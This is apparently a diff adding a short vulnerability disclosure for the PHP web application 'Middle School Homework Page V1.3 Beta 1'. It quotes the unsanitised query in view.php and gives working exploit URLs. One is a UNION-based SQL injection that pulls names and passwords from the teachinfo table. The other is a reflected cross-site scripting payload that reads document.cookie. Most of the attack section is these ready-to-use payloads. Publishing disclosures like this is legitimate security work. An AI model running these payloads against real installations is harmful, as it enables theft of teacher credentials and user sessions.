@@ -1,0 +1,37 @@
+Middle School Homework Page V1.3 Beta 1  - Multiple Vulnerabilties
+===================================================================
+
+####################################################################
+.:. Author         : AtT4CKxT3rR0r1ST
+.:. Contact        : [F.Hack@w.cn] , [AtT4CKxT3rR0r1ST@gmail.com]
+.:. Home           : http://www.iphobos.com/blog/
+.:. Script         : http://sourceforge.net/projects/mshwpage/
+####################################################################
+
+I. Sql Injection
+
+##############
+VULNERABILITY
+##############
+/view.php (line 3-4)
+-----------------------------------------------------------------------------
+
+<h2>Homework for <?php get_array("select * from class where
+classID=$_REQUEST[class]", 'classDesc') ?> as of <?php $today = date("M j
+G:i:s T Y");echo $today; ?>:</h2>
+<?php
+
+-----------------------------------------------------------------------------
+
+#########
+EXPLOIT
+#########
+(
+localhost/mshwpage/view.php?class=null+and+1=2+union+select+1,concat(name,0x3a,pass)+from+teachinfo
+
+
+II. Cross Site Scripting
+
+localhost/mshwpage/view.php?class=<script>alert(document.cookie);</script>
+
+####################################################################
